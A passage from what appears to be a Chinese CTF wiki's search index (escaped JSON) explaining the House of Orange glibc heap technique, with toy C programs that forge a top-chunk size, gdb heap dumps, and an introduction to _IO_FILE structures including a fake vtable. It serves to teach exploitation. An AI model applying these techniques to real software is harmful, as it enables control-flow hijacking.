chunk\uff0c\u4f46\u662f\u8981\u5b9e\u73b0\u8fd9\u4e2a\u76ee\u7684\u9700\u8981\u7ed5\u8fc7\u4e00\u4e9blibc\u4e2d\u7684check\u3002\n\u9996\u5148\uff0cmalloc\u7684\u5c3a\u5bf8\u4e0d\u80fd\u5927\u4e8e mmp_.mmap_threshold  if ((unsigned long)(nb)  = (unsigned long)(mp_.mmap_threshold)   (mp_.n_mmaps   mp_.n_mmaps_max)) \n\u5982\u679c\u6240\u9700\u5206\u914d\u7684 chunk \u5927\u5c0f\u5927\u4e8e mmap \u5206\u914d\u9608\u503c\uff0c\u9ed8\u8ba4\u4e3a 128K\uff0c\u5e76\u4e14\u5f53\u524d\u8fdb\u7a0b\u4f7f\u7528 mmap()\u5206\u914d\u7684\u5185\u5b58\u5757\u5c0f\u4e8e\u8bbe\u5b9a\u7684\u6700\u5927\u503c\uff0c\u5c06\u4f7f\u7528 mmap()\u7cfb\u7edf\u8c03\u7528\u76f4\u63a5\u5411\u64cd\u4f5c\u7cfb\u7edf\u7533\u8bf7\u5185\u5b58\u3002  \u5728sysmalloc\u51fd\u6570\u4e2d\u5b58\u5728\u5bf9top chunk size\u7684check\uff0c\u5982\u4e0b  assert((old_top == initial_top(av)   old_size == 0) ||\n     ((unsigned long) (old_size)  = MINSIZE  \n      prev_inuse(old_top)  \n      ((unsigned long)old_end   pagemask) == 0)); \n\u8fd9\u91cc\u68c0\u67e5\u4e86top chunk\u7684\u5408\u6cd5\u6027\uff0c\u5982\u679c\u7b2c\u4e00\u6b21\u8c03\u7528\u672c\u51fd\u6570\uff0ctop chunk\u53ef\u80fd\u6ca1\u6709\u521d\u59cb\u5316\uff0c\u6240\u4ee5\u53ef\u80fdold_size\u4e3a0\u3002\n\u5982\u679ctop chunk\u5df2\u7ecf\u521d\u59cb\u5316\u4e86\uff0c\u90a3\u4e48top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u5927\u4e8e\u7b49\u4e8eMINSIZE\uff0c\u56e0\u4e3atop chunk\u4e2d\u5305\u542b\u4e86 fencepost\uff0c\u6240\u4ee5top chunk\u7684\u5927\u5c0f\u5fc5\u987b\u8981\u5927\u4e8eMINSIZE\u3002\u5176\u6b21Top chunk\u5fc5\u987b\u6807\u8bc6\u524d\u4e00\u4e2achunk\u5904\u4e8einuse\u72b6\u6001\uff0c\u5e76\u4e14top chunk\u7684\u7ed3\u675f\u5730\u5740\u5fc5\u5b9a\u662f\u9875\u5bf9\u9f50\u7684\u3002\u6b64\u5916top chunk\u9664\u53bbfencepost\u7684\u5927\u5c0f\u5fc5\u5b9a\u8981\u5c0f\u4e8e\u6240\u9700chunk\u7684\u5927\u5c0f\uff0c\u5426\u5219\u5728_int_malloc()\u51fd\u6570\u4e2d\u4f1a\u4f7f\u7528top chunk\u5206\u5272\u51fachunk\u3002  \u6211\u4eec\u603b\u7ed3\u4e00\u4e0b\u4f2a\u9020\u7684top chunk size\u7684\u8981\u6c42  1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875  2.size\u8981\u5927\u4e8eMINSIZE(0x10)  3.size\u8981\u5c0f\u4e8e\u4e4b\u540e\u7533\u8bf7\u7684chunk size + MINSIZE(0x10)  4.size\u7684prev inuse\u4f4d\u5fc5\u987b\u4e3a1  \u4e4b\u540e\u539f\u6709\u7684top chunk\u5c31\u4f1a\u6267\u884c _int_free \u4ece\u800c\u987a\u5229\u8fdb\u5165unsorted bin\u4e2d\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_4", 
            "text": "\u8fd9\u91cc\u7ed9\u51fa\u4e86\u4e00\u4e2a\u793a\u4f8b\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u6a21\u62df\u4e86\u4e00\u4e2a\u6ea2\u51fa\u8986\u76d6\u5230top chunk\u7684size\u57df\u3002\u6211\u4eec\u8bd5\u56fe\u628asize\u6539\u5c0f\u4ece\u800c\u5b9e\u73b0brk\u6269\u5c55\uff0c\u5e76\u628a\u539f\u6709\u7684top chunk\u653e\u5165unsorted bin\u4e2d\u3002  #define fake_size 0x41\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size; // overwrite top chunk size\n\n    malloc(0x60);\n\n    malloc(0x60);\n} \n\u8fd9\u91cc\u6211\u4eec\u628atop chunk\u7684size\u8986\u76d6\u4e3a0x41\u3002\u4e4b\u540e\u7533\u8bf7\u5927\u4e8e\u8fd9\u4e2a\u5c3a\u5bf8\u7684\u5806\u5757\uff0c\u53730x60\u3002\n\u4f46\u662f\u5f53\u6211\u4eec\u6267\u884c\u8fd9\u4e2a\u793a\u4f8b\u65f6\u4f1a\u53d1\u73b0\uff0c\u8fd9\u4e2a\u7a0b\u5e8f\u5e76\u4e0d\u80fd\u5229\u7528\u6210\u529f\uff0c\u539f\u56e0\u5728\u4e8eassert\u5e76\u6ca1\u6709\u88ab\u6ee1\u8db3\u4ece\u800c\u629b\u51fa\u4e86\u5f02\u5e38\u3002  [#0] 0x7ffff7a42428 \u2192 Name: __GI_raise(sig=0x6)\n[#1] 0x7ffff7a4402a \u2192 Name: __GI_abort()\n[#2] 0x7ffff7a8a2e8 \u2192 Name: __malloc_assert(assertion=0x7ffff7b9e150  (old_top == initial_top (av)   old_size == 0) || ((unsigned long) (old_size)  = MINSIZE   prev_inuse (old_top)   ((unsigned long) old_end   (pagesize - 1)) == 0) , file=0x7ffff7b9ab85  malloc.c , line=0x95a, function=0x7ffff7b9e998  __func__.11509   sysmalloc )\n[#3] 0x7ffff7a8e426 \u2192 Name: sysmalloc(nb=0x70, av=0x7ffff7dd1b20  main_arena )", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/heap/house_of_orange/#_5", 
            "text": "\u6211\u4eec\u56de\u5934\u6765\u770b\u4e00\u4e0bassert\u7684\u6761\u4ef6\uff0c\u53ef\u4ee5\u53d1\u73b0\u4e4b\u524d\u5217\u51fa\u7684\u6761\u76ee\u90fd\u88ab\u6ee1\u8db3\u4e86\u9664\u4e86\u7b2c\u4e00\u6761\u3002  1.\u4f2a\u9020\u7684size\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u5185\u5b58\u9875  \u4ec0\u4e48\u662f\u5bf9\u9f50\u5230\u5185\u5b58\u9875\u5462\uff1f\u6211\u4eec\u77e5\u9053\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u90fd\u662f\u4ee5\u5185\u5b58\u9875\u4e3a\u5355\u4f4d\u8fdb\u884c\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u4e00\u822c\u5185\u5b58\u9875\u7684\u5927\u5c0f\u662f4kb\u3002\u90a3\u4e48\u6211\u4eec\u4f2a\u9020\u7684size\u5c31\u5fc5\u987b\u8981\u5bf9\u9f50\u5230\u8fd9\u4e2a\u5c3a\u5bf8\u3002\u5728\u8986\u76d6\u4e4b\u524dtop chunk\u7684size\u5927\u5c0f\u662f20fe1\uff0c\u901a\u8fc7\u8ba1\u7b97\u5f97\u77e50x602020+0x20fe0=0x623000\u662f\u5bf9\u4e8e0x1000\uff084kb\uff09\u5bf9\u9f50\u7684\u3002  0x602000:   0x0000000000000000  0x0000000000000021\n0x602010:   0x0000000000000000  0x0000000000000000\n0x602020:   0x0000000000000000  0x0000000000020fe1  == top chunk\n0x602030:   0x0000000000000000  0x0000000000000000 \n\u56e0\u6b64\u6211\u4eec\u4f2a\u9020\u7684fake_size\u53ef\u4ee5\u662f0x0fe1\u30010x1fe1\u30010x2fe1\u30010x3fe1\u7b49\u5bf94kb\u5bf9\u9f50\u7684size\u3002\u800c0x40\u4e0d\u6ee1\u8db3\u5bf9\u9f50\uff0c\u56e0\u6b64\u4e0d\u80fd\u5b9e\u73b0\u5229\u7528\u3002  #define fake_size 0x1fe1\n\nint main(void)\n{\n    void *ptr;\n\n    ptr=malloc(0x10);\n    ptr=(void *)((int)ptr+24);\n\n    *((long long*)ptr)=fake_size;\n\n    malloc(0x2000);\n\n    malloc(0x60);\n}  \u8fdb\u884c\u5206\u914d\u4e4b\u540e\u6211\u4eec\u53ef\u4ee5\u89c2\u5bdf\u5230\u539f\u6765\u7684\u5806\u7ecf\u8fc7\u4e86brk\u6269\u5c55  //\u539f\u6709\u7684\u5806\n0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]\n\n//\u7ecf\u8fc7\u6269\u5c55\u7684\u5806\n0x0000000000602000 0x0000000000646000 0x0000000000000000 rw- [heap]  \u6211\u4eec\u7684\u7533\u8bf7\u88ab\u5206\u914d\u52300x623010\u7684\u4f4d\u7f6e\uff0c\u540c\u65f6\u539f\u6709\u7684\u5806\u88ab\u7f6e\u5165unsorted bin  [+] unsorted_bins[0]: fw=0x602020, bk=0x602020\n \u2192   Chunk(addr=0x602030, size=0x1fc0, flags=PREV_INUSE)  \u56e0\u4e3aunsorted bin\u4e2d\u5b58\u5728\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u4e0b\u6b21\u7684\u5206\u914d\u4f1a\u5207\u5272\u8fd9\u4e2a\u5757   malloc(0x60);\n 0x602030\n\n[+] unsorted_bins[0]: fw=0x602090, bk=0x602090\n \u2192   Chunk(addr=0x6020a0, size=0x1f50, flags=PREV_INUSE)  \u53ef\u4ee5\u770b\u5230\u5206\u914d\u7684\u5185\u5b58\u662f\u4eceunsorted bin\u4e2d\u5207\u5272\u7684\uff0c\u5185\u5b58\u5e03\u5c40\u5982\u4e0b  0x602030:   0x00007ffff7dd2208  0x00007ffff7dd2208  == \u672a\u88ab\u6e05\u96f6\u7684unsorted bin\u94fe\u8868\n0x602040:   0x0000000000602020  0x0000000000602020\n0x602050:   0x0000000000000000  0x0000000000000000\n0x602060:   0x0000000000000000  0x0000000000000000\n0x602070:   0x0000000000000000  0x0000000000000000\n0x602080:   0x0000000000000000  0x0000000000000000\n0x602090:   0x0000000000000000  0x0000000000001f51  == \u5207\u5272\u5269\u4e0b\u7684\u65b0unsorted bin\n0x6020a0:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n0x6020b0:   0x0000000000000000  0x0000000000000000  \u5176\u5b9ehouse of orange\u7684\u8981\u70b9\u6b63\u5728\u4e8e\u6b64\uff0c\u4e4b\u540e\u7684\u5229\u7528\u56e0\u4e3a\u6d89\u53ca\u5230_IO_FILE\u7684\u77e5\u8bc6\uff0c\u653e\u5230IO_FILE\u72ec\u7acb\u7ae0\u8282\u5206\u4eab\u3002", 
            "title": "\u6b63\u786e\u7684\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/io_file/introduction/", 
            "text": "FILE\u7ed3\u6784\n\n\nFILE\u4ecb\u7ecd\n\n\nFILE\u5728Linux\u7cfb\u7edf\u7684\u6807\u51c6IO\u5e93\u4e2d\u662f\u7528\u4e8e\u63cf\u8ff0\u6587\u4ef6\u7684\u7ed3\u6784\uff0c\u79f0\u4e3a\u6587\u4ef6\u6d41\u3002\nFILE\u7ed3\u6784\u5728\u7a0b\u5e8f\u6267\u884cfopen\u7b49\u51fd\u6570\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\uff0c\u5e76\u5206\u914d\u5728\u5806\u4e2d\u3002\u6211\u4eec\u5e38\u5b9a\u4e49\u4e00\u4e2a\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\u6765\u63a5\u6536\u8fd9\u4e2a\u8fd4\u56de\u503c\u3002\n\n\nFILE\u7ed3\u6784\u5b9a\u4e49\u5728libio.h\u4e2d\uff0c\u5982\u4e0b\u6240\u793a\n\n\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n#define _IO_file_flags _flags\n\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n#if 0\n  int _blksize;\n#else\n  int _flags2;\n#endif\n  _IO_off_t _old_offset; /* This used to be _offset but it\ns too small.  */\n\n#define __HAVE_COLUMN /* temporary */\n  /* 1+column number of pbase(); 0 is unknown. */\n  unsigned short _cur_column;\n  signed char _vtable_offset;\n  char _shortbuf[1];\n\n  /*  char* _save_gptr;  char* _save_egptr; */\n\n  _IO_lock_t *_lock;\n#ifdef _IO_USE_OLD_IO_FILE\n};\n\n\n\n\n\u8fdb\u7a0b\u4e2d\u7684FILE\u7ed3\u6784\u4f1a\u901a\u8fc7_chain\u57df\u5f7c\u6b64\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u94fe\u8868\u5934\u90e8\u7528\u5168\u5c40\u53d8\u91cf_IO_list_all\u8868\u793a\uff0c\u901a\u8fc7\u8fd9\u4e2a\u503c\u6211\u4eec\u53ef\u4ee5\u904d\u5386\u6240\u6709\u7684FILE\u7ed3\u6784\u3002\n\n\n\u5728\u6807\u51c6I/O\u5e93\u4e2d\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u542f\u52a8\u65f6\u6709\u4e09\u4e2a\u6587\u4ef6\u6d41\u662f\u81ea\u52a8\u6253\u5f00\u7684\uff1astdin\u3001stdout\u3001stderr\u3002\u56e0\u6b64\u5728\u521d\u59cb\u72b6\u6001\u4e0b\uff0c_IO_list_all\u6307\u5411\u4e86\u4e00\u4e2a\u6709\u8fd9\u4e9b\u6587\u4ef6\u6d41\u6784\u6210\u7684\u94fe\u8868\uff0c\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u4e09\u4e2a\u6587\u4ef6\u6d41\u4f4d\u4e8elibc.so\u7684\u6570\u636e\u6bb5\u3002\u800c\u6211\u4eec\u4f7f\u7528fopen\u521b\u5efa\u7684\u6587\u4ef6\u6d41\u662f\u5206\u914d\u5728\u5806\u5185\u5b58\u4e0a\u7684\u3002\n\n\n\u6211\u4eec\u53ef\u4ee5\u5728libc.so\u4e2d\u627e\u5230stdin\\stdout\\stderr\u7b49\u7b26\u53f7\uff0c\u8fd9\u4e9b\u7b26\u53f7\u662f\u6307\u5411FILE\u7ed3\u6784\u7684\u6307\u9488\uff0c\u771f\u6b63\u7ed3\u6784\u7684\u7b26\u53f7\u662f\n\n\n_IO_2_1_stderr_\n_IO_2_1_stdout_\n_IO_2_1_stdin_\n\n\n\n\n\u4f46\u662f\u4e8b\u5b9e\u4e0a_IO_FILE\u7ed3\u6784\u5916\u5305\u88f9\u7740\u53e6\u4e00\u79cd\u7ed3\u6784_IO_FILE_plus\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u91cd\u8981\u7684\u6307\u9488vtable\u6307\u5411\u4e86\u4e00\u7cfb\u5217\u51fd\u6570\u6307\u9488\u3002\n\n\n\u5728libc2.23\u7248\u672c\u4e0b\uff0c32\u4f4d\u7684vtable\u504f\u79fb\u4e3a0x94\uff0c64\u4f4d\u504f\u79fb\u4e3a0x228\n\n\nstruct _IO_FILE_plus\n{\n    _IO_FILE    file;\n    IO_jump_t   *vtable;\n}\n\n\n\n\nvtable\u662fIO_jump_t\u7c7b\u578b\u7684\u6307\u9488\uff0cIO_jump_t\u4e2d\u4fdd\u5b58\u4e86\u4e00\u4e9b\u51fd\u6570\u6307\u9488\uff0c\u5728\u540e\u9762\u6211\u4eec\u4f1a\u770b\u5230\u5728\u4e00\u7cfb\u5217\u6807\u51c6IO\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570\u6307\u9488\n\n\nvoid\u00a0*\u00a0funcs[]\u00a0=\u00a0{\n\u00a0\u00a0\u00a01\u00a0NULL,\u00a0//\u00a0\nextra\u00a0word\n\n\u00a0\u00a0\u00a02\u00a0NULL,\u00a0//\u00a0DUMMY\n\u00a0\u00a0\u00a03\u00a0exit,\u00a0//\u00a0finish\n\u00a0\u00a0\u00a04\u00a0NULL,\u00a0//\u00a0overflow\n\u00a0\u00a0\u00a05\u00a0NULL,\u00a0//\u00a0underflow\n\u00a0\u00a0\u00a06\u00a0NULL,\u00a0//\u00a0uflow\n\u00a0\u00a0\u00a07\u00a0NULL,\u00a0//\u00a0pbackfail\n\u00a0\u00a0\u00a0\n\u00a0\u00a0\u00a08\u00a0NULL,\u00a0//\u00a0xsputn  #printf\n\u00a0\u00a0\u00a09\u00a0NULL,\u00a0//\u00a0xsgetn\n\u00a0\u00a0\u00a010\u00a0NULL,\u00a0//\u00a0seekoff\n\u00a0\u00a0\u00a011\u00a0NULL,\u00a0//\u00a0seekpos\n\u00a0\u00a0\u00a012\u00a0NULL,\u00a0//\u00a0setbuf\n\u00a0\u00a0\u00a013\u00a0NULL,\u00a0//\u00a0sync\n\u00a0\u00a0\u00a014\u00a0NULL,\u00a0//\u00a0doallocate\n\u00a0\u00a0\u00a015\u00a0NULL,\u00a0//\u00a0read\n\u00a0\u00a0\u00a016\u00a0NULL,\u00a0//\u00a0write\n\u00a0\u00a0\u00a017\u00a0NULL,\u00a0//\u00a0seek\n\u00a0\u00a0\u00a018\u00a0pwn,\u00a0\u00a0//\u00a0close\n\u00a0\u00a0\u00a019\u00a0NULL,\u00a0//\u00a0stat\n\u00a0\u00a0\u00a020\u00a0NULL,\u00a0//\u00a0showmanyc\n\u00a0\u00a0\u00a021\u00a0NULL,\u00a0//\u00a0imbue\n};\n\n\n\n\nfread\n\n\nfread\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u4ece\u6587\u4ef6\u6d41\u4e2d\u8bfb\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nsize_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;\n\n\n\n\n\n\n\n\nbuffer \u5b58\u653e\u8bfb\u53d6\u6570\u636e\u7684\u7f13\u51b2\u533a\u3002\n\n\n\n\n\n\nsize\uff1a\u6307\u5b9a\u6bcf\u4e2a\u8bb0\u5f55\u7684\u957f\u5ea6\u3002\n\n\n\n\n\n\ncount\uff1a \u6307\u5b9a\u8bb0\u5f55\u7684\u4e2a\u6570\u3002\n\n\n\n\n\n\nstream\uff1a\u76ee\u6807\u6587\u4ef6\u6d41\u3002\n\n\n\n\n\n\n\u8fd4\u56de\u503c\uff1a\u8fd4\u56de\u8bfb\u53d6\u5230\u6570\u636e\u7f13\u51b2\u533a\u4e2d\u7684\u8bb0\u5f55\u4e2a\u6570\n\n\n\n\n\n\ndread\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofread.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fread\uff0c\u4f46\u771f\u6b63\u7684\u529f\u80fd\u5b9e\u73b0\u5728\u5b50\u51fd\u6570_IO_sgetn\u4e2d\u3002\n\n\n_IO_size_t\n_IO_fread (buf, size, count, fp)\n     void *buf;\n     _IO_size_t size;\n     _IO_size_t count;\n     _IO_FILE *fp;\n{\n  ...\n  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);\n  ...\n}\n\n\n\n\n\u5728_IO_sgetn\u51fd\u6570\u4e2d\u4f1a\u8c03\u7528_IO_XSGETN\uff0c\u800c_IO_XSGETN\u662f_IO_FILE_plus.vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u5728\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u65f6\u4f1a\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u7136\u540e\u518d\u8fdb\u884c\u8c03\u7528\u3002\n\n\n_IO_size_t\n_IO_sgetn (fp, data, n)\n     _IO_FILE *fp;\n     void *data;\n     _IO_size_t n;\n{\n  return _IO_XSGETN (fp, data, n);\n}\n\n\n\n\n\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u51fd\u6570\u6307\u9488\u662f\u6307\u5411_IO_file_xsgetn\u51fd\u6570\u7684\uff0c\n\n\n  if (fp-\n_IO_buf_base\n          \n want \n (size_t) (fp-\n_IO_buf_end - fp-\n_IO_buf_base))\n        {\n          if (__underflow (fp) == EOF)\n        break;\n\n          continue;\n        }\n\n\n\n\nfwrite\n\n\nfwrite\u540c\u6837\u662f\u6807\u51c6IO\u5e93\u51fd\u6570\uff0c\u4f5c\u7528\u662f\u5411\u6587\u4ef6\u6d41\u5199\u5165\u6570\u636e\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nsize_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);\n\n\n\n\n\n\n\n\nbuffer:\u662f\u4e00\u4e2a\u6307\u9488\uff0c\u5bf9fwrite\u6765\u8bf4\uff0c\u662f\u8981\u5199\u5165\u6570\u636e\u7684\u5730\u5740;\n\n\n\n\n\n\nsize:\u8981\u5199\u5165\u5185\u5bb9\u7684\u5355\u5b57\u8282\u6570;\n\n\n\n\n\n\ncount:\u8981\u8fdb\u884c\u5199\u5165size\u5b57\u8282\u7684\u6570\u636e\u9879\u7684\u4e2a\u6570;\n\n\n\n\n\n\nstream:\u76ee\u6807\u6587\u4ef6\u6307\u9488;\n\n\n\n\n\n\n\u8fd4\u56de\u503c\uff1a\u5b9e\u9645\u5199\u5165\u7684\u6570\u636e\u9879\u4e2a\u6570count\u3002\n\n\n\n\n\n\nfwrite\u7684\u4ee3\u7801\u4f4d\u4e8e/libio/iofwrite.c\u4e2d\uff0c\u51fd\u6570\u540d\u4e3a_IO_fwrite\u3002\n\u5728_IO_fwrite\u4e2d\u4e3b\u8981\u662f\u8c03\u7528_IO_XSPUTN\u6765\u5b9e\u73b0\u5199\u5165\u7684\u529f\u80fd\u3002\n\n\n\u6839\u636e\u524d\u9762\u5bf9_IO_FILE_plus\u7684\u4ecb\u7ecd\uff0c\u53ef\u77e5_IO_XSPUTN\u4f4d\u4e8e_IO_FILE_plus\u7684vtable\u4e2d\uff0c\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u9700\u8981\u9996\u5148\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\uff0c\u518d\u8df3\u8fc7\u53bb\u8fdb\u884c\u8c03\u7528\u3002\n\n\nwritten = _IO_sputn (fp, (const char *) buf, request);\n\n\n\n\n\u5728_IO_XSPUTN\u5bf9\u5e94\u7684\u9ed8\u8ba4\u51fd\u6570_IO_new_file_xsputn\u4e2d\u4f1a\u8c03\u7528\u540c\u6837\u4f4d\u4e8evtable\u4e2d\u7684_IO_OVERFLOW\n\n\n /* Next flush the (full) buffer. */\n      if (_IO_OVERFLOW (f, EOF) == EOF)\n\n\n\n\n_IO_OVERFLOW\u9ed8\u8ba4\u5bf9\u5e94\u7684\u51fd\u6570\u662f_IO_new_file_overflow\n\n\nif (ch == EOF)\n    return _IO_do_write (f, f-\n_IO_write_base,\n             f-\n_IO_write_ptr - f-\n_IO_write_base);\n  if (f-\n_IO_write_ptr == f-\n_IO_buf_end ) /* Buffer is really full */\n    if (_IO_do_flush (f) == EOF)\n      return EOF;\n\n\n\u5728_IO_new_file_overflow\u5185\u90e8\u6700\u7ec8\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3write\u51fd\u6570\n\n\nfopen\n\n\nfopen\u5728\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u6253\u5f00\u6587\u4ef6\uff0c\u51fd\u6570\u539f\u578b\u5982\u4e0b\n\n\nFILE *fopen(char *filename, *type);\n\n\n\n\n\n\n\n\nfilename:\u76ee\u6807\u6587\u4ef6\u7684\u8def\u5f84\n\n\n\n\n\n\ntype:\u6253\u5f00\u65b9\u5f0f\u7684\u7c7b\u578b\n\n\n\n\n\n\n\u8fd4\u56de\u503c:\u8fd4\u56de\u4e00\u4e2a\u6587\u4ef6\u6307\u9488\n\n\n\n\n\n\n\u5728fopen\u5185\u90e8\u4f1a\u521b\u5efaFILE\u7ed3\u6784\u5e76\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\uff0c\u4e0b\u9762\u6765\u770b\u4e00\u4e0b\u8fd9\u4e2a\u8fc7\u7a0b\n\n\n\u9996\u5148\u5728fopen\u5bf9\u5e94\u7684\u51fd\u6570__fopen_internal\u5185\u90e8\u4f1a\u8c03\u7528malloc\u51fd\u6570\uff0c\u5206\u914dFILE\u7ed3\u6784\u7684\u7a7a\u95f4\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u83b7\u77e5FILE\u7ed3\u6784\u662f\u5b58\u50a8\u5728\u5806\u4e0a\u7684\n\n\n*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));\n\n\n\n\n\u4e4b\u540e\u4f1a\u4e3a\u521b\u5efa\u7684FILE\u521d\u59cb\u5316vtable\uff0c\u5e76\u8c03\u7528_IO_file_init\u8fdb\u4e00\u6b65\u521d\u59cb\u5316\u64cd\u4f5c\n\n_IO_JUMPS (\nnew_f-\nfp) = \n_IO_file_jumps;\n_IO_file_init (\nnew_f-\nfp);\n\n\n\n\u5728_IO_file_init\u51fd\u6570\u7684\u521d\u59cb\u5316\u64cd\u4f5c\u4e2d\uff0c\u4f1a\u8c03\u7528_IO_link_in\u628a\u65b0\u5206\u914d\u7684FILE\u94fe\u5165_IO_list_all\u4e3a\u8d77\u59cb\u7684FILE\u94fe\u8868\u4e2d\n\nvoid\n_IO_link_in (fp)\n     struct _IO_FILE_plus *fp;\n{\n    if ((fp-\nfile._flags \n _IO_LINKED) == 0)\n    {\n      fp-\nfile._flags |= _IO_LINKED;\n      fp-\nfile._chain = (_IO_FILE *) _IO_list_all;\n      _IO_list_all = fp;\n      ++_IO_list_all_stamp;\n    }\n}\n\n\n\n\u4e4b\u540e__fopen_internal\u51fd\u6570\u4f1a\u8c03\u7528_IO_file_fopen\u51fd\u6570\u6253\u5f00\u76ee\u6807\u6587\u4ef6\uff0c_IO_file_fopen\u4f1a\u6839\u636e\u7528\u6237\u4f20\u5165\u7684\u6253\u5f00\u6a21\u5f0f\u8fdb\u884c\u6253\u5f00\u64cd\u4f5c\uff0c\u603b\u4e4b\u6700\u540e\u4f1a\u8c03\u7528\u5230\u7cfb\u7edf\u63a5\u53e3open\u51fd\u6570\uff0c\u8fd9\u91cc\u4e0d\u518d\u6df1\u5165\u3002\n\nif (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)\n    return __fopen_maybe_mmap (\nnew_f-\nfp.file);\n\n\n\n\u603b\u7ed3\u4e00\u4e0bfopen\u7684\u64cd\u4f5c\u662f\n\n\n\n\n\u4f7f\u7528malloc\u5206\u914dFILE\u7ed3\u6784\n\n\n\u8bbe\u7f6eFILE\u7ed3\u6784\u7684vtable\n\n\n\u521d\u59cb\u5316\u5206\u914d\u7684FILE\u7ed3\u6784\n\n\n\u5c06\u521d\u59cb\u5316\u7684FILE\u7ed3\u6784\u94fe\u5165FILE\u7ed3\u6784\u94fe\u8868\u4e2d\n\n\n\u8c03\u7528\u7cfb\u7edf\u8c03\u7528\u6253\u5f00\u6587\u4ef6\n\n\n\n\nfclose\n\n\nfclose\u662f\u6807\u51c6IO\u5e93\u4e2d\u7528\u4e8e\u5173\u95ed\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u51fd\u6570\uff0c\u5176\u4f5c\u7528\u4e0efopen\u76f8\u53cd\u3002\n\n\nint fclose(FILE *stream)\n\n\n\u529f\u80fd\uff1a\u5173\u95ed\u4e00\u4e2a\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528fclose\u5c31\u53ef\u4ee5\u628a\u7f13\u51b2\u533a\u5185\u6700\u540e\u5269\u4f59\u7684\u6570\u636e\u8f93\u51fa\u5230\u78c1\u76d8\u6587\u4ef6\u4e2d\uff0c\u5e76\u91ca\u653e\u6587\u4ef6\u6307\u9488\u548c\u6709\u5173\u7684\u7f13\u51b2\u533a\n\n\nfclose\u9996\u5148\u4f1a\u8c03\u7528_IO_unlink_it\u5c06\u6307\u5b9a\u7684FILE\u4ece_chain\u94fe\u8868\u4e2d\u8131\u94fe\n\n\nif (fp-\n_IO_file_flags \n _IO_IS_FILEBUF)\n    _IO_un_link ((struct _IO_FILE_plus *) fp);\n\n\n\n\n\u4e4b\u540e\u4f1a\u8c03\u7528_IO_file_close_it\u51fd\u6570\uff0c_IO_file_close_it\u4f1a\u8c03\u7528\u7cfb\u7edf\u63a5\u53e3close\u5173\u95ed\u6587\u4ef6\n\n\nif (fp-\n_IO_file_flags \n _IO_IS_FILEBUF)\n    status = _IO_file_close_it (fp);\n\n\n\n\n\u6700\u540e\u8c03\u7528vtable\u4e2d\u7684_IO_FINISH\uff0c\u5176\u5bf9\u5e94\u7684\u662f_IO_file_finish\u51fd\u6570\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528free\u51fd\u6570\u91ca\u653e\u4e4b\u524d\u5206\u914d\u7684FILE\u7ed3\u6784\n\n\n_IO_FINISH 